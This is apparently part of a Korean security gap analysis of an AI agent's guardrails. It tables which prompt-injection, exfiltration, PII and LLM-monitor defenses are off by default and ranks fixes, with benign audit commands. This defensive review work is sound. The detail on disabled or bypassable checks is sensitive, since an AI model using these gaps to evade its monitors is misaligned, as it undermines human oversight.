| `network_policy` — 도메인 allowlist | ✅ | ✅ | ❌ `bash.rs:392`는 `execute_sandboxed` 안이고, `bash.rs:131`의 `if !use_system`에서만 도달. `use_system`은 `ctx.config.shell_mode` 유래이며 `config/core_config.rs:154-157`이 `#[default] System`("데스크톱/서버 기본") | **OFF** (데스크톱 기본) |
| `audit_text` (23룰) | ✅ | ✅ | ⚠ 프로덕션 호출부가 **매니페스트 등록 2곳뿐** — 툴 결과·LLM 출력에는 미적용 | **부분 ON** |
| PII 엔진 (49 인식기) | ✅ | ❌ `guardrails` feature가 `tinicore/Cargo.toml:19`, `tinicli/Cargo.toml:27`, `argo-cli/Cargo.toml:34` **어느 default에도 없음**(`:22-27`에 "deliberately NOT in this list" 명시) | ❌ 컴파일 자체가 안 됨 | **OFF** |
| PII 마스킹 (`EgressMask`) | ✅ | ✅ `sensitive`는 default ON | ❌ 꽂을 탐지기가 위에서 컴파일 제외 + `pii_mode` 기본 `Off`(`tinicli/guardrails/pii.rs:124` `Some("off") \| None => Self::Off`). `run_onboarding.rs`에 `pii_mode` 기록 없음, `config.rs:2858,2883`은 테스트 픽스처 | **OFF** (이중 게이트) |
| TOOL-INPUT 팩 (G1~G4) | ✅ | ✅ | ❌ `ARGO_GUARDRAIL_TOOL_PACK` env JSON 필요(`guardrails.rs:1066`) | **OFF** |
| exfil 팩 (url_scan, needles) | ✅ | ✅ | ❌ `ARGO_GUARDRAIL_EXFIL` env JSON 필요(`:1088`) | **OFF** |
| `DeniedPatternGuardrail` | ✅ | ✅ | ❌ `ARGO_GUARDRAIL_DENY_*` 필요. 빈 패턴이면 `Ok(None)` → 등록 안 함. `guardrails.rs:1041-1104`에서 전부 미설정 시 `NothingToInstall` | **OFF** |
| TOOL-OUTPUT 가드레일 체인 | ✅ 배선 존재(`execution.rs:3221`) | ✅ | ❌ 위 세 팩이 모두 OFF → `set.tool_output`이 비어 블록 미실행 | **OFF** |
| `PromptGuard` | ✅ | ✅ | ❌ `loop_.rs:681` `ctx.config.prompt_guard.is_empty()` → skip. **`CliConfig`에 `prompt_guard` 필드 자체가 없어 `config.toml`로도 도달 불가**. 워크스페이스 유일 설정자는 `tinicore/tests/prompt_guard_e2e.rs:221` | **OFF** |
| 분류기 가드레일 | ✅ | ✅ | ❌ 호스트가 툴별 `ToolSignal`을 공급해야 분류. 미공급 툴은 분류 안 함 | **OFF** |

### 4.1 가드레일 셋 설치 경로 (3개, 모두 호스트 공급 의존)

| 경로 | 위치 | 입력 |
|---|---|---|
| `install_guardrails_from_env("ARGO")` | `tinicli/src/cli_entry.rs:158` | env `ARGO_GUARDRAIL_*` |
| `install_guardrails_from_env(...)` | `argo-pc/rust-backend/src/bridge.rs:12094` | env |
| `install_guardrails(set)` 직접 | `tiniffi/src/lib.rs:28712` | 호스트 공급 **JSON** `guardrails.{denyInput,denyOutput,denyToolInput,denyToolOutput,toolPack,exfil}` (`:28555-28712`) |

**세 경로 모두 기본값을 공급하지 않는다.** 레포 어디에도 그 env나 JSON을 채워 주는
기본 설정이 없으므로 §4 표의 OFF 판정은 유지된다.

이는 의도된 설계다 — Core 레이어 규칙상 **Core는 정책을 하드코딩할 수 없고** 모든 룰은
호스트(Product)가 공급해야 한다. 결과적으로 "메커니즘은 다 있는데 기본값이 비어 있어
아무것도 안 도는" 상태가 기본이 된다.

### 4.2 요약

- **기본 ON**: 시크릿 값 스크럽, Untrusted 격리 봉투, SSRF·아웃바운드 URL 검증,
  경로 검증(`path_validator`), 사설IP 판정, 매니페스트 감사(등록 시점 한정)
- **기본 OFF**: PII 탐지·마스킹 전부, 툴 입력 팩 G1~G4, exfil 팩, 패턴 가드레일,
  TOOL-OUTPUT 체인 전체, PromptGuard, LLM 분류기, 도메인 allowlist(데스크톱 기본 셸에서)

---

## 5. 결론 요약표

| ClawKeeper 모듈 | ARGO 대응 | 대응물 현재 상태 | **ARGO 도입 필요 여부** |
|---|---|---|---|
| `return_content_scan` | `audit_text` 룰은 있음, 적용 지점 없음 | 매니페스트 등록 시점만 | **배선 필요 (1순위) · 룰 이식 불필요** — `audit_text`를 `ToolOutputGuardrail`로 감싸 `execution.rs:3221` 체인에 등록. 새 정규식 0개 |
| `script_body_scan` | 사실상 없음 (`static_scan`은 시점·대상 다름) | — | **신규 구현 권장 (2순위)** — 동적 경로 조립은 `path_validator`의 리터럴 검증을 우회 |
| `url_safety` 호모글리프 | 없음 | — | **신규 구현 권장 (3순위)** — `security/url_validator.rs` 옆이 제자리 |
| `credential_redact` | PII 엔진 + `audit.rs` + `scrubber` | scrubber만 ON | **인식기 2종 추가 권장** (`jwt`, `aws_secret_key` 40자) **+ `password` 계열 키 이름 확장**. 정규식은 `audit.rs`에서 가져올 것 |
| `Judge`의 툴 루프 임계 | 없음 | — | **조건부 도입** — 다중 턴 drift 방어. 단 ClawKeeper 기본값(`maxToolStepsWithoutUserTurn: 3`)은 실사용에 지나치게 낮음 |
| `exec_gate` | `command_safety`(화이트리스트) | 기본 OFF | **이식 불필요 · 배선 필요** — 이식하면 오히려 약해짐(`ver` 오탐 실측). 단 켜더라도 `EscalateAction`을 `Allow`로 두면 `Unknown`이 통과함에 유의 |
| `path_guard` | `path_validator`(ON) + G3·G4(OFF) | 부분 ON | **이식 불필요 · G3/G4 배선 필요** — 기본 ON 층은 예외 없는 거친 차단이라 오탐 여지가 있고, 세밀한 층이 꺼져 있음 |
| `url_safety` SSRF | `ssrf.rs` + `url_validator` | **ON** | **불필요** — ARGO가 더 강함 |
| `input_validator` | G1 arg-shape | 기본 OFF | **이식 불필요 · 배선 필요** — ClawKeeper도 hermes에 설치 안 함 |
| `budget` | 없음 | — | **불필요** — 가드가 아니고 Core 레이어 규칙 위반 |
| Watcher (LLM 감시) | `guardrails_classifier` | 기본 OFF | **이식 불필요 · 배선 필요** — 메커니즘 이미 있음 |

### 5.1 가장 중요한 발견

**이식보다 배선이 우선이다.** ARGO는 ClawKeeper가 제공하는 방어의 대부분을 이미 코드로
갖고 있고 여러 곳에서 더 강하다(argv 화이트리스트, DNS 해석 SSRF, 가역 마스킹, PII 인식기
49종). 그런데 §4대로 **상당수가 기본 OFF**다. 반대로 ClawKeeper 쪽도 hermes에서 가장 가치
있는 두 가드가 로깅 전용이고(§1.5(1)), `computer_use` 경로는 아예 오작동한다(§1.5(2)).

실제 보안 효과 순서:

1. **`audit_text`를 TOOL-OUTPUT 체인에 등록** — 룰을 새로 쓰지 않고 이미 있는 탐지기를
   안 보고 있는 지점에 연결. 투입 대비 효과 최대
2. **기본 정책 배포 결정** — Core가 정책을 못 박을 수 없다면, 호스트(tinicli) 기본 프로필로
   권장 설정을 제공할지 결정. 이 결정 없이는 3·4를 만들어도 기본값에서 안 돈다
3. `script_body_scan` 신규 구현
4. 호모글리프 판정 신규 구현 + PII 인식기 2종 추가

---

## 부록 A. 검증 재현용 명령어

```bash
# 커밋 고정 확인
for d in ARGO-ClawKeeper ClawKeeper hermes-agent; do
  printf "%-16s " "$d"; git -C ~/Works/$d log --oneline -1; done

# ClawKeeper가 hermes에 설치하는 가드 (input_validator/budget 부재 확인)
sed -n '/^def _default_pre_guards/,/^def install/p' ~/Works/ClawKeeper/clawkeeper_core/adapters/hermes.py

# 패턴 카탈로그 사용처 — PROMPT_INJECTION_PATTERNS가 hermes 경로에 없음을 확인
grep -rn "PROMPT_INJECTION_PATTERNS\|DANGEROUS_COMMAND_PATTERNS" \
  ~/Works/ClawKeeper/clawkeeper_core/ --include="*.py"

# exec_gate 오탐 실측
cd ~/Works/ClawKeeper && python3 -c "
import importlib.util, sys
spec = importlib.util.spec_from_file_location('sr','clawkeeper_core/security_rules.py')
sr = importlib.util.module_from_spec(spec); sys.modules['sr']=sr; spec.loader.exec_module(sr)
for cmd in ['cat server.log','git log --oneline','ls -la']:
    hits=[p.pattern for p in sr.DANGEROUS_COMMAND_PATTERNS if p.search(cmd)]
    print(f'{cmd:22} -> {hits[0][:40] if hits else \"clean\"}')"

# computer_use 콜백 규약 불일치 (§1.5-2)
sed -n '605,640p' ~/Works/hermes-agent/tools/computer_use/tool.py    # cb(action, args, summary)
grep -n "def approval_cb" ~/Works/ClawKeeper/clawkeeper_core/adapters/hermes.py

# thread-local 반증 (rev.1 철회 근거)
grep -n "def propagate_context_to_thread" -A 12 ~/Works/hermes-agent/tools/thread_context.py
sed -n '60,80p' ~/Works/hermes-agent/tools/computer_use/tool.py       # 모듈 전역

# ARGO safety 모듈 전수 조사
cd ~/Works/ARGO-ClawKeeper
find tinicore/src tinicore-traits/src -type d \( -name "*guard*" -o -name "*sensitive*" \
  -o -name "*security*" -o -name "*policy*" \)

# 활성화 판정 근거
grep -n -A 10 '^default = \[' tinicore/Cargo.toml          # guardrails 부재
grep -n '^default = ' tinicli/Cargo.toml argo-cli/Cargo.toml
sed -n '1060,1105p' tinicore/src/agent/guardrails.rs        # env 없으면 None
grep -rn "install_guardrails_from_env\|install_guardrails(" --include="*.rs" . | grep -v "^./tinicore/src/agent/guardrails.rs"
grep -n "prompt_guard.is_empty" tinicore/src/agent/loop_.rs
grep -n "shell_mode\|ShellMode" tinicore/src/config/core_config.rs | head
grep -n "indirect-prompt-injection" tinicore/src/tools/tool_orchestrator/execution.rs

# 수치 확인
grep -c 'pii_type:' tinicore/src/guardrails/config/pii_filter_config.yaml   # 49
grep -c '^    Rule {' tinicore/src/dispatchable_policy/audit.rs             # 23
grep -rc "impl.*SensitiveDetector for" --include="*.rs" . | grep -v ':0'    # 합 30
```

## 부록 B. rev.2 리뷰 변경 이력

서브에이전트 3인이 각각 §0-1 / §2 / §3-5를 코드와 대조해 리뷰했고, 지적 중
실제 코드로 재확인된 것만 반영했다.

**판정이 뒤집힌 것**

| 항목 | rev.1 | rev.2 | 근거 |
|---|---|---|---|
| 승인 콜백 thread-local 유실 | "차단 경로가 사라짐" | **철회** | `thread_context.py:64`가 워커에 콜백 전파. `computer_use`는 모듈 전역 |
| `computer_use` 차단력 | "차단 가능" | **오작동 — 전부 거부** | `tool.py:619` `cb(action,args,summary)` 3인자 vs `approval_cb(command, description="")` 2인자 → TypeError → `"deny"` |
| `network_policy` | ON | **도메인 allowlist는 OFF** | `core_config.rs:154-157` `#[default] System` |
| `credential_redact` 갭 | `jwt` 1종 | **3종** | `aws_secret_key`(40자), `generic_secret_kv` 키 이름 커버리지 추가 |
| `install_guardrails` 호출 경로 | 2곳(env) | **3곳** | `tiniffi/src/lib.rs:28712`는 호스트 JSON 기반 |

**수치·인용 정정**: 호모글리프 그리스 16→18자, `script_body_scan` 마커 18/24→19(고유 18)/25,
`return_content_scan_guard` 위치 `:122`→`:181`, Judge 분기 5→6개,
PII 엔진 LOC 5.9k→≈4.3k(`handwritten`은 디렉터리), `secret_*` 그룹 1203→1752,
`SensitiveDetector` impl 10→30(1 프로덕션 + 29 더블), PromptGuard 호출부 `:674`→`:1895`,
`InvisiblePayload`에 BiDi override 추가, 차단 경로는 `detect_any`가 아니라 `detect_any_of`.

**리뷰 지적 중 기각한 것**: "`indirect prompt injection` 주석이 존재하지 않는다" →
`execution.rs:3209`에 하이픈 표기(`indirect-prompt-injection`)로 실재. 리뷰어가 띄어쓰기
형태로만 검색한 것으로 확인.
